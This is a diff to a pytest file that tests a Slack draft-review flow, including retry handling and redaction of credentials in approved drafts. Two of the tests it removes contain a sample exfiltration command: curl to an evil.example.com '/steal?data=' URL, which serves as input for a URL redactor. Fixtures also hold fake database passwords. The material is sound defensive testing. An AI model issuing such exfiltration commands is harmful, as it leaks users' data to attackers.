@@ -7,6 +7,7 @@ import time
 from unittest.mock import AsyncMock, MagicMock, patch
 
 import pytest
+from slack_sdk.errors import SlackApiError
 from slack_wire_helpers import slack_wire
 
 from kiro_crew.slack.blocks import (
@@ -676,6 +677,8 @@ class TestHandleReviewApprove:
         _review_drafts_set("C1|ts1|abc", "plain text with no secrets", REQUESTER_ID)
         await _handle_review_approve(_make_payload(user_id=OWNER_ID), _make_action())
         assert mock_orch.slack.post_message.await_count == 1
+        # The approve claims the draft, so a second press cannot post it again.
+        assert "C1|ts1|abc" not in _review_drafts
 
     @pytest.mark.asyncio
     async def test_credential_draft_warns_and_keeps_redaction(
@@ -687,7 +690,8 @@ class TestHandleReviewApprove:
         whole channel, so a member who copies the command must be told the
         credential was stripped or they hit an opaque downstream error.
         """
-        secret = "postgresql://user:pass@host:5432/db"
+        # A password that is no placeholder word, so the URL's userinfo is a credential.
+        secret = "postgresql://user:Pw9x-s3cr3t@host:5432/db"
         _review_drafts_set("C1|ts1|abc", f"run: {secret}", REQUESTER_ID)
         await _handle_review_approve(_make_payload(user_id=OWNER_ID), _make_action())
 
@@ -696,7 +700,7 @@ class TestHandleReviewApprove:
         warning = mock_orch.slack.post_message.await_args_list[1].args[1]
         # Redaction is NOT relaxed: the secret never reaches the channel.
         assert secret not in posted_draft
-        assert "pass@host" not in posted_draft
+        assert "Pw9x-s3cr3t" not in posted_draft
         assert "[REDACTED: credential]" in posted_draft
         # The warning tells the user the text was altered and carries no secret.
         assert "redaction placeholder" in warning
@@ -705,41 +709,15 @@ class TestHandleReviewApprove:
         assert secret not in warning
 
     @pytest.mark.asyncio
-    async def test_url_draft_warns_with_the_url_remedy_and_keeps_redaction(
-        self, mock_orch, owner_patch, sel_mock
-    ) -> None:
-        """A URL rewrite in an approved draft must not be silent either.
-
-        The approve path runs ``redact_exfiltration_urls`` over the draft before
-        posting it publicly, so a channel member can copy a command whose link is
-        now a placeholder. The follow-up must say it was a URL and name the URL
-        remedy (re-check the link), not the credential one (re-enter a secret).
-        """
-        url = "https://evil.example.com/steal?data=" + "A" * 250
-        _review_drafts_set("C1|ts1|abc", f"run: curl '{url}'", REQUESTER_ID)
-        await _handle_review_approve(_make_payload(user_id=OWNER_ID), _make_action())
-
-        assert mock_orch.slack.post_message.await_count == 2
-        posted_draft = mock_orch.slack.post_message.await_args_list[0].args[1]
-        warning = mock_orch.slack.post_message.await_args_list[1].args[1]
-        # Redaction is NOT relaxed: the URL never reaches the channel, the tag does.
-        assert "evil.example.com/steal" not in posted_draft
-        assert "[REDACTED: suspicious URL to " in posted_draft
-        assert "Security notice" in warning
-        assert "suspicious URL" in warning
-        assert "re-check" in warning
-        assert "credential" not in warning
-        assert "supply the secret" not in warning
-        assert "evil.example.com" not in warning
-
-    @pytest.mark.asyncio
     async def test_credential_only_draft_wording_is_unchanged_by_the_url_tally(
         self, mock_orch, owner_patch, sel_mock
     ) -> None:
         """Regression guard: a credential-only draft posts the exact prior sentence."""
         from kiro_crew.messaging.renderer import credential_redaction_notice
 
-        _review_drafts_set("C1|ts1|abc", "run: postgresql://user:pass@host:5432/db", REQUESTER_ID)
+        _review_drafts_set(
+            "C1|ts1|abc", "run: postgresql://user:Pw9x-s3cr3t@host:5432/db", REQUESTER_ID
+        )
         await _handle_review_approve(_make_payload(user_id=OWNER_ID), _make_action())
 
         assert mock_orch.slack.post_message.await_count == 2
@@ -747,28 +725,11 @@ class TestHandleReviewApprove:
         assert warning == credential_redaction_notice(1)
 
     @pytest.mark.asyncio
-    async def test_credential_and_url_draft_posts_exactly_one_warning_naming_both(
-        self, mock_orch, owner_patch, sel_mock
-    ) -> None:
-        url = "https://evil.example.com/steal?data=" + "A" * 250
-        _review_drafts_set(
-            "C1|ts1|abc", f"postgresql://user:pass@host:5432/db then {url}", REQUESTER_ID
-        )
-        await _handle_review_approve(_make_payload(user_id=OWNER_ID), _make_action())
-
-        assert mock_orch.slack.post_message.await_count == 2
-        warning = mock_orch.slack.post_message.await_args_list[1].args[1]
-        assert "credential" in warning
-        assert "suspicious URL" in warning
-        assert "supply the secret" in warning
-        assert "re-check" in warning
-
-    @pytest.mark.asyncio
     async def test_credential_notice_failure_does_not_break_approve(
         self, mock_orch, owner_patch, sel_mock
     ) -> None:
         """A failing notice post must not abort the approve flow (best-effort)."""
-        secret = "postgresql://user:pass@host:5432/db"
+        secret = "postgresql://user:Pw9x-s3cr3t@host:5432/db"
         _review_drafts_set("C1|ts1|abc", f"run: {secret}", REQUESTER_ID)
         # First call (the draft) succeeds; the follow-up notice raises.
         mock_orch.slack.post_message = AsyncMock(side_effect=[None, RuntimeError("api down")])
@@ -776,6 +737,38 @@ class TestHandleReviewApprove:
         # The draft was posted and the audit still records success.
         assert mock_orch.slack.post_message.await_count == 2
         assert _has_sel_call(sel_mock, "allowed")
+
+    @pytest.mark.asyncio
+    async def test_failed_draft_post_keeps_the_draft_for_a_retry(
+        self, mock_orch, owner_patch, sel_mock
+    ) -> None:
+        """A post Slack refuses leaves the draft approvable from the same buttons."""
+        from slack_sdk.errors import SlackApiError
+
+        _review_drafts_set("C1|ts1|abc", "the reply", REQUESTER_ID)
+        refused = SlackApiError("ratelimited", {"ok": False, "error": "ratelimited"})
+        mock_orch.slack.post_message = AsyncMock(side_effect=refused)
+        with pytest.raises(SlackApiError):
+            await _handle_review_approve(_make_payload(user_id=OWNER_ID), _make_action())
+        assert _review_drafts_get("C1|ts1|abc") == ("the reply", REQUESTER_ID)
+        assert not _has_sel_call(sel_mock, "allowed")
+
+        mock_orch.slack.post_message = AsyncMock()
+        await _handle_review_approve(_make_payload(user_id=REQUESTER_ID), _make_action())
+        mock_orch.slack.post_message.assert_awaited_once()
+        assert mock_orch.slack.post_message.await_args.args[1] == "the reply"
+        assert _review_drafts_get("C1|ts1|abc") == ("", "")
+
+    @pytest.mark.asyncio
+    async def test_a_lost_response_does_not_restore_the_draft(
+        self, mock_orch, owner_patch, sel_mock
+    ) -> None:
+        """A dropped connection may have posted the draft, so a retry must not repost it."""
+        _review_drafts_set("C1|ts1|abc", "the reply", REQUESTER_ID)
+        mock_orch.slack.post_message = AsyncMock(side_effect=ConnectionResetError("reset"))
+        with pytest.raises(ConnectionResetError):
+            await _handle_review_approve(_make_payload(user_id=OWNER_ID), _make_action())
+        assert _review_drafts_get("C1|ts1|abc") == ("", "")
 
     @pytest.mark.asyncio
     async def test_stranger_denied_and_notified(
@@ -878,6 +871,83 @@ class TestHandleReviewEditSubmit:
         await _handle_review_edit_submit(payload)
         mock_orch.slack.post_message.assert_awaited_once()
         assert _review_drafts_get("C1|ts1|abc") == ("", "")
+
+    @pytest.mark.asyncio
+    async def test_failed_submit_keeps_edit_and_reposts_card(
+        self, mock_orch, owner_patch, sel_mock
+    ) -> None:
+        """A failed post stores the edited text and re-posts a review card to retry."""
+        _review_drafts_set("C1|ts1|abc", "original", REQUESTER_ID)
+        mock_orch.slack.post_message.side_effect = SlackApiError(
+            "boom", {"ok": False, "error": "internal_error"}
+        )
+        payload = _make_payload(
+            user_id=OWNER_ID,
+            view={
+                "private_metadata": "C1|ts1|abc",
+                "state": {
+                    "values": {
+                        "mc_review_edit_block": {"mc_review_edit_input": {"value": "edited text"}}
+                    }
+                },
+            },
+        )
+        await _handle_review_edit_submit(payload)
+        assert _review_drafts_get("C1|ts1|abc") == ("edited text", REQUESTER_ID)
+        mock_orch.slack.post_ephemeral.assert_awaited_once()
+        call = mock_orch.slack.post_ephemeral.await_args
+        assert call.args[:3] == ("C1", OWNER_ID, "edited text")
+        assert call.kwargs["thread_ts"] == "ts1"
+        assert call.kwargs["blocks"] == review_draft_blocks("edited text", "C1|ts1|abc")
+        mock_orch.slack.set_thread_status.assert_not_awaited()
+
+        # The re-posted card's Approve button now posts the edited text.
+        mock_orch.slack.post_message.side_effect = None
+        mock_orch.slack.post_message.reset_mock()
+        await _handle_review_approve(_make_payload(user_id=OWNER_ID), _make_action())
+        mock_orch.slack.post_message.assert_awaited_once_with("C1", "edited text", "ts1")
+
+    @pytest.mark.asyncio
+    async def test_failed_submit_reposts_channel_level_card_unthreaded(
+        self, mock_orch, owner_patch, sel_mock
+    ) -> None:
+        key = "C1|ts1|abc|root"
+        _review_drafts_set(key, "original", REQUESTER_ID)
+        mock_orch.slack.post_message.side_effect = SlackApiError(
+            "boom", {"ok": False, "error": "internal_error"}
+        )
+        payload = _make_payload(
+            user_id=OWNER_ID,
+            view={
+                "private_metadata": key,
+                "state": {
+                    "values": {
+                        "mc_review_edit_block": {"mc_review_edit_input": {"value": "edited text"}}
+                    }
+                },
+            },
+        )
+        await _handle_review_edit_submit(payload)
+        assert mock_orch.slack.post_ephemeral.await_args.kwargs["thread_ts"] is None
+
+    @pytest.mark.asyncio
+    async def test_stale_modal_submit_without_draft_posts_nothing(
+        self, mock_orch, owner_patch, sel_mock
+    ) -> None:
+        """An owner's stale modal must not post once the draft was already claimed."""
+        payload = _make_payload(
+            user_id=OWNER_ID,
+            view={
+                "private_metadata": "C1|ts1|abc",
+                "state": {
+                    "values": {
+                        "mc_review_edit_block": {"mc_review_edit_input": {"value": "edited text"}}
+                    }
+                },
+            },
+        )
+        await _handle_review_edit_submit(payload)
+        mock_orch.slack.post_message.assert_not_awaited()
 
     @pytest.mark.asyncio
     async def test_stranger_submit_denied(self, mock_orch, owner_patch, sel_mock) -> None:
